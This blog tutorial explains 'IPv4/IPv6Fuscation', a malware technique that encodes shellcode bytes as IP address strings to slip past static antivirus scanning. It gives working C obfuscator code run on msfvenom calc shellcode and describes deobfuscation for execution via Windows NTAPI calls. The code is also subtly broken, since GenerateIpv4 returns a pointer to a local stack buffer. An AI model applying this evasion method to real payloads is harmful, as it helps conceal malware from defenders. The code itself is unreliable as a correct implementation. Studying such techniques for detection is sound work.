
# What is Obfuscation?
<br>
Malware is one of the most prevalent and persistent threats in the world of technology. To evade detection and analysis, malware developers often employ various techniques to conceal their malicious code and behavior. One of these techniques is **payload obfuscation**, which involves transforming the payload into a form that is not easily recognizable by static analysis tools. Payload obfuscation can be achieved by using different encodings, packers, steganography, or custom algorithms. Another technique is [payload encryption](https://kylerosario.com/blog/XOREncryption), which scrambles the payload using a key, making it unreadable without the proper decryption. By combining both techniques, the payload becomes more difficult to understand and recover. In this blog, I will explore the concept and methods of payload obfuscation, and how it differs from payload encryption, another common technique to protect malware from prying eyes. By understanding how payload obfuscation works, we can better defend ourselves against the evolving malware landscape.
<br>
## IPv4/IPv6Fuscation Explained: 

IPv4/IPv6Fuscation stands out as an obfuscation technique where the bytes of shellcode are transformed into IPv4 or IPv6 strings. This blog will shed light on how to convert bytes from Msfvenom x64 calc shellcode into both IPv4 and IPv6 strings, offering a deeper understanding of this obfuscation approach.
<br>
## IPv4Fuscation: 
<br>
In IPv4Fuscation, each byte of the shellcode corresponds to an octet in the resulting IPv4 string. For instance, by converting hex bytes FC, 48, 83, and E4 to decimal format, we obtain the IPv4 string 252.72.131.228. The implementation involves a function, GenerateIpv4, which takes four shellcode bytes and transforms them into an IPv4 string.
<br>

Below is the code used to obfuscate any given input, assuming it is an array of bytes:
,
```c
#include <Windows.h>
#include <stdio.h>

// Disable error 4996 (caused by sprintf)
#pragma warning(disable: 4996)

// Function takes in 4 raw bytes and returns them in an IPv4 string format
char* GenerateIpv4(int a, int b, int c, int d) {
    // The buffer to store the resulting IPv4 address string
    unsigned char Output[32];

    // Creating the IPv4 address and saving it to the 'Output' variable 
    sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

    // Optional: Print the 'Output' variable to the console
    // printf("[i] Output: %s\n", Output);

    // Returning the IPv4 address as a string
    return (char*)Output;
}

// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    // If the shellcode buffer is null or the size is not a multiple of 4, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0) {
        return FALSE;
    }

    // Print the start of the array declaration
    printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));

    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
    // The variable 'c' is used to store the number of bytes read. By default, starts at 4.
    int c = 4, counter = 0;
    char* IP = NULL;

    // Loop through the shellcode bytes
    for (int i = 0; i < ShellcodeSize; i++) {
        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
        if (c == 4) {
            counter++;

            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3] 
            IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

            // Check if it's the last set of 4 bytes
            if (i == ShellcodeSize - 4) {
                // Printing the last IPv4 address
                printf("\"%s\"", IP);
                break;
            }
            else {
                // Printing the IPv4 address
                printf("\"%s\", ", IP);
            }

            // Resetting the byte counter
            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 8 == 0) {
                printf("\n\t");
            }
        }
        else {
            // Incrementing the byte counter
            c++;
        }
    }

    // Print the end of the array declaration
    printf("\n};\n\n");

    // Return TRUE to indicate successful execution
    return TRUE;
}

// x64 calc metasploit shellcode {272 bytes} generated with msfvenom
unsigned char rawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {
    // Generate and print the IPv4 representation of the provided shellcode
    if (!GenerateIpv4Output(rawData, sizeof(rawData))) {
        return -1;
    }

    // Pause to view the result
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}

```
<br>
## IPv6Fuscation: 
<br>
IPv6Fuscation, similar to IPv4Fuscation, transforms shellcode bytes into an IPv6 string. However, in this case, 16 bytes generate one IPv6 address. The conversion process doesn't require decimal format, offering flexibility. For example, the sample shellcode FC48:83E4:F0E8:C000:0000:4151:4150:5251 showcases the transformation. The implementation employs the GenerateIpv6 function, converting 16 shellcode bytes into an IPv6 address.
<br>
IPv4 Implementation Details - To implement IPv4Fuscation, we need to ensure the shellcode is a multiple of 4 bytes. The GenerateIpv4Output function takes care of processing the shellcode, generating IPv4 addresses, and presenting the results in an array.
<br>
IPv6 Implementation Details - IPv6Fuscation requires the shellcode to be a multiple of 16 bytes. The GenerateIpv6Output function follows a similar logic, processing the shellcode and producing an array of IPv6 addresses.
<br>
## Deobfuscation Process: 
<br>
Once the obfuscated payload bypasses static detection, the deobfuscation process is crucial for execution. IPv4/IPv6Fuscation deobfuscation involves utilizing NTAPI functions, specifically RtlIpv4StringToAddressA and RtlIpv6StringToAddressA. These functions convert string representations of IP addresses back into binary format.
<br>
## Deobfuscating IPv4Fuscation Payloads: 
<br>
The Ipv4Deobfuscation function reverses the IPv4Fuscation process, converting IPv4 strings back into bytes. It utilizes the RtlIpv4StringToAddressA function and allocates memory for the deobfuscated payload. The result is a binary representation ready for execution.
<br>
## Deobfuscating IPv6Fuscation Payloads: 

Similarly, the Ipv6Deobfuscation function handles the deobfuscation of IPv6Fuscation payloads. It employs the RtlIpv6StringToAddressA function, ensuring each IPv6 address is transformed into 16 bytes for execution.
<br>
## Wrapping things up
<br>
This deep dive into Payload Obfuscation, specifically IPv4/IPv6Fuscation, unveils a powerful technique employed by malware developers. Understanding the conversion processes and deobfuscation steps is crucial for cybersecurity professionals in the ongoing battle against evolving threats. Stay vigilant, keep learning, and stay ahead in comprehending the tactics employed by adversaries. Thank you for engaging in this journey of cybersecurity exploration!